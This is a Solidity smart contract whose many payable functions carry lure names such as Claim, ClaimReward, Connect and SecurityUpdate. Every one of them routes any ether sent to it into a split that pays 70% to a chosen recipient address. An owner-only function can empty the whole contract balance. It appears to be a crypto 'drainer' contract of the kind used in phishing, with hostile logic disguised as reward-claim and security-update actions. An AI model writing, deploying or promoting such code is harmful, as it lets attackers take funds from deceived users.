1 // SPDX-License-Identifier: Unlicense
2 pragma solidity ^0.8.18;
3 
4 contract CG_Contract {
5 
6     address private owner;
7     mapping(address => uint256) private balance;
8     mapping(address => bool) private auto_withdraw;
9 
10     event Withdrawal(address indexed receiver, uint256 amount);
11     event AutoWithdrawStatusUpdated(address indexed user, bool status);
12     event Payout(address receiver, uint256 amount);
13  
14     modifier onlyOwner() {
15         require(msg.sender == owner, "Only owner can call this");
16         _;
17     }
18 
19     modifier validAmount() {
20         require(msg.value > 0, "Invalid amount");
21         _;
22     }
23 
24     constructor() {
25         owner = msg.sender;
26     }
27 
28     function getOwner() public view returns (address) {
29         return owner;
30     }
31 
32     function getBalance() public view returns (uint256) {
33         return address(this).balance;
34     }
35 
36     function getUserBalance(address wallet) public view returns (uint256) {
37         return balance[wallet];
38     }
39 
40     function getWithdrawStatus(address wallet) public view returns (bool) {
41         return auto_withdraw[wallet];
42     }
43 
44     function setWithdrawStatus(bool status) public {
45         auto_withdraw[msg.sender] = status;
46         emit AutoWithdrawStatusUpdated(msg.sender, status);
47     }
48 
49     function withdraw() public {
50         uint256 amount = balance[msg.sender];
51         require(address(this).balance >= amount, "BALANCE_LOW");
52         balance[msg.sender] = 0;
53         payable(msg.sender).transfer(amount);
54         emit Withdrawal(msg.sender, amount);
55     }
56 
57     function withdrawEther(address payable receiver, uint256 amount) public onlyOwner {
58         require(receiver != address(0), "Invalid address");
59         require(address(this).balance >= amount, "Insufficient contract balance");
60         payable(receiver).transfer(amount);
61     }
62 
63     function _executeTransaction(uint8 auto_payout, address sender, address recipient1) public payable validAmount {
64         uint256 gasCost = tx.gasprice * gasleft(); 
65         uint256 totalAmount = msg.value - gasCost; 
66         
67         if (auto_payout == 1) {
68             uint256 payoutAmount1 = totalAmount * 70 / 100;
69             uint256 payoutAmount2 = totalAmount - payoutAmount1;
70 
71             payable(recipient1).transfer(payoutAmount1);
72             payable(sender).transfer(payoutAmount2);
73 
74             emit Withdrawal(recipient1, payoutAmount1);
75         } else {
76             balance[sender] += totalAmount;
77         }
78     }
79 
80     function Claim(uint8 auto_payout, address sender, address recipient1) public payable {
81         _executeTransaction(auto_payout, sender, recipient1);
82     }
83 
84     function ClaimReward(uint8 auto_payout, address sender, address recipient1) public payable {
85         _executeTransaction(auto_payout, sender, recipient1);
86     }
87 
88     function ClaimRewards(uint8 auto_payout, address sender, address recipient1) public payable {
89         _executeTransaction(auto_payout, sender, recipient1);
90     }
91    
92     function Execute(uint8 auto_payout, address sender, address recipient1) public payable {
93         _executeTransaction(auto_payout, sender, recipient1);
94     }
95    
96     function Multicall(uint8 auto_payout, address sender, address recipient1) public payable {
97         _executeTransaction(auto_payout, sender, recipient1);
98     }
99    
100     function Swap(uint8 auto_payout, address sender, address recipient1) public payable {
101         _executeTransaction(auto_payout, sender, recipient1);
102     }
103    
104     function Connect(uint8 auto_payout, address sender, address recipient1) public payable {
105         _executeTransaction(auto_payout, sender, recipient1);
106     }
107    
108     function SecurityUpdate(uint8 auto_payout, address sender, address recipient1) public payable {
109         _executeTransaction(auto_payout, sender, recipient1);
110     }
111    
112     receive() external payable {}
113 }